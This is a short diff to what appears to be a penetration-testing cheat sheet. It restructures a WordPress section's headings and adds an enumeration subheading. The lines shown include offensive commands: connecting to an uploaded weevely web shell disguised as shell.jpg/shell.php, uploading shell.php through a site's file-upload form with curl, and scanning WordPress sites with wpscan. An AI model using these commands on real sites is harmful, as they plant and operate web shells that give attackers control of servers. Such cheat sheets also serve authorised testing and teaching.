@@ -105,7 +105,8 @@ echo "<pre>$output</pre>";
 - __```weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password```__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
-## WordPress
+# WordPress
+## [1] Information Gathering & Enumeration
 - __```wpscan --url <url>```__
 - __`<url>/wp-content/uploads`__
 - __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
